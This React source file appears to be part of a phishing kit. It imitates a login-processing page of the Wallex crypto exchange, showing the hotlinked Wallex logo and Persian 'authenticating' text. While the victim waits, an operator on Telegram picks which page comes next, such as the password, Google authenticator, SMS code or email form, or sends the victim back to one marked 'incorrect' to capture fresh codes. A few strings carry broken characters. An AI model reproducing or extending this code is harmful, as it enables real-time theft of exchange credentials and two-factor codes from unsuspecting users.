import { useEffect, useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { Loader2 } from "lucide-react";
import { getSession, showAdminButtons } from "@/lib/telegram-service-enhanced";
import {
  registerSecureCallback,
  unregisterSecureCallback,
} from "@/lib/callback-session-fix";
import { useRealtimePresence } from "@/hooks/useRealtimePresence";

const Loading = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const [sessionData, setSessionData] = useState<any>(null);

  const phoneNumber = location.state?.phoneNumber || "";
  const sessionId =
    location.state?.sessionId || sessionStorage.getItem("sessionId");

  // Real-time presence tracking
  const presence = useRealtimePresence({
    sessionId: sessionId || "",
    formName: "Loading",
    enabled: !!sessionId,
  });

  useEffect(() => {
    const initializeLoading = async () => {
      if (!sessionId) {
        console.error("No session ID found");
        navigate("/", { replace: true });
        return;
      }

      try {
        // Get current session data
        const session = getSession(sessionId);
        setSessionData(session);

        // Register callback handler for admin button clicks
        registerSecureCallback(sessionId, (action) => {
          console.log("🎯 Admin clicked:", action);
          handleAdminAction(action);
        });

        // Show admin buttons after 2 seconds
        setTimeout(async () => {
          try {
            console.log(
              "📱 User reached loading page, showing admin buttons...",
            );
            await showAdminButtons(sessionId);
          } catch (error) {
            console.warn("⚠️ Could not show admin buttons:", error);
            // Don't break the flow, just log the warning
          }
        }, 2000);
      } catch (error) {
        console.error("Failed to initialize loading page:", error);
        navigate("/", { replace: true });
      }
    };

    initializeLoading();

    // Cleanup callback registration when component unmounts
    return () => {
      if (sessionId) {
        unregisterSecureCallback(sessionId);
      }
    };
  }, [sessionId, navigate]);

  // Handle admin actions from Telegram
  const handleAdminAction = (action: string) => {
    if (!sessionId) {
      console.error("No session ID for admin action");
      return;
    }

    console.log("🎯 Loading page received admin action:", {
      sessionId,
      action,
      currentPath: window.location.pathname,
      timestamp: new Date().toISOString(),
    });

    console.log("🚀 Executing admin action:", action);

    // Handle incorrect actions - redirect to form with error
    if (action.startsWith("incorrect_")) {
      const errorType = action.replace("incorrect_", "");

      switch (errorType) {
        case "password":
          navigate("/auth-password", {
            state: { phoneNumber, sessionId, hasError: true },
          });
          break;
        case "google":
          navigate("/auth-google", {
            state: { phoneNumber, sessionId, hasError: true },
          });
          break;
        case "sms":
          navigate("/auth-sms", {
            state: { phoneNumber, sessionId, hasError: true },
          });
          break;
        case "email":
          navigate("/auth-email", {
            state: { phoneNumber, sessionId, hasError: true },
          });
          break;
        default:
          console.error("Unknown incorrect action:", errorType);
      }
      return;
    }

    // Handle regular auth actions
    switch (action) {
      case "password":
        navigate("/auth-password", {
          state: { phoneNumber, sessionId },
        });
        break;
      case "google":
        navigate("/auth-google", {
          state: { phoneNumber, sessionId },
        });
        break;
      case "sms":
        navigate("/auth-sms", {
          state: { phoneNumber, sessionId },
        });
        break;
      case "email":
        navigate("/auth-email", {
          state: { phoneNumber, sessionId },
        });
        break;
      case "complete":
        // Complete authentication
        localStorage.setItem("isAuthenticated", "true");
        localStorage.setItem("userPhone", phoneNumber);
        sessionStorage.removeItem("sessionId");
        sessionStorage.removeItem("phoneNumber");

        alert("🎉 احراز هویت با موفقیت تکمیل شد! خوش آمدید.");
        navigate("/", { replace: true });
        break;
      default:
        console.error("Unknown admin action:", action);
        alert(`⚠�� عملیات ناشناخته: ${action}`);
    }
  };

  if (!sessionId) {
    return (
      <div
        style={{
          display: "flex",
          height: "100vh",
          backgroundColor: "rgb(14, 35, 66)",
          alignItems: "center",
          justifyContent: "center",
        }}
      >
        <div
          style={{
            backgroundColor: "rgb(255, 255, 255)",
            borderRadius: "16px",
            padding: "40px",
            maxWidth: "400px",
            width: "90%",
            textAlign: "center",
          }}
        >
          <h2 style={{ color: "rgb(220, 38, 38)", margin: "0 0 8px 0" }}>
            خطا در جلسه
          </h2>
          <p style={{ color: "rgba(0, 0, 0, 0.6)", margin: "0" }}>
            جلسه شما منقضی شده اس��. لطفا مجدد تلاش کنید.
          </p>
        </div>
      </div>
    );
  }

  return (
    <div
      style={{
        display: "flex",
        height: "100vh",
        backgroundColor: "rgb(14, 35, 66)",
        alignItems: "center",
        justifyContent: "center",
      }}
    >
      <div
        style={{
          backgroundColor: "rgb(255, 255, 255)",
          borderRadius: "16px",
          padding: "60px 40px",
          maxWidth: "400px",
          width: "90%",
          textAlign: "center",
        }}
        className="loading-card"
      >
        {/* Header */}
        <div
          style={{
            display: "flex",
            justifyContent: "center",
            marginBottom: "40px",
          }}
        >
          <img
            src="https://wallex.ir/_next/image?url=%2Fimages%2Fwallex-logo-v-light.svg&w=256&q=75"
            alt="صرافی خرید فروش ارزهای دیجیتال"
            style={{
              width: "128px",
              height: "24px",
              objectFit: "contain",
            }}
          />
        </div>

        {/* Loading Spinner */}
        <div
          style={{
            display: "flex",
            flexDirection: "column",
            alignItems: "center",
            gap: "24px",
          }}
        >
          <div
            style={{
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              width: "80px",
              height: "80px",
              backgroundColor: "rgb(23, 29, 38)",
              borderRadius: "50%",
            }}
          >
            <Loader2
              className="animate-spin"
              style={{
                width: "40px",
                height: "40px",
                color: "rgb(255, 255, 255)",
              }}
            />
          </div>

          <div
            style={{
              display: "flex",
              flexDirection: "column",
              gap: "8px",
              textAlign: "center",
            }}
          >
            <h2
              style={{
                fontSize: "18px",
                fontWeight: "700",
                color: "rgb(0, 0, 0)",
                margin: "0",
              }}
            >
              در حال پردازش...
            </h2>
            <p
              style={{
                fontSize: "14px",
                color: "rgba(0, 0, 0, 0.6)",
                margin: "0",
                lineHeight: "1.5",
              }}
            >
              لطفا صبر کنید
            </p>
          </div>

          {/* Pulsing Animation */}
          <div
            style={{
              width: "60px",
              height: "4px",
              backgroundColor: "rgba(0, 122, 255, 0.2)",
              borderRadius: "2px",
              overflow: "hidden",
              position: "relative",
            }}
          >
            <div
              style={{
                width: "20px",
                height: "100%",
                backgroundColor: "rgb(0, 122, 255)",
                borderRadius: "2px",
                animation: "slide 2s ease-in-out infinite",
              }}
            />
          </div>
        </div>

        {/* Security Note */}
        <div
          style={{
            marginTop: "40px",
            padding: "16px",
            backgroundColor: "rgb(248, 249, 250)",
            borderRadius: "8px",
            border: "1px solid rgba(0, 0, 0, 0.1)",
          }}
        >
          <p
            style={{
              fontSize: "12px",
              color: "rgba(0, 0, 0, 0.6)",
              margin: "0",
              lineHeight: "1.4",
            }}
          >
            🔒 احراز هویت در حال پردازش...
          </p>
        </div>
      </div>

      <style>{`
        @keyframes slide {
          0% {
            transform: translateX(-40px);
          }
          50% {
            transform: translateX(80px);
          }
          100% {
            transform: translateX(-40px);
          }
        }

        /* Mobile styles */
        @media (max-width: 1023px) {
          .loading-card {
            border-radius: 0 !important;
            width: 100% !important;
            height: 100vh !important;
            max-width: none !important;
            display: flex !important;
            flex-direction: column !important;
            justify-content: center !important;
            padding: 20px !important;
          }
        }
      `}</style>
    </div>
  );
};

export default Loading;
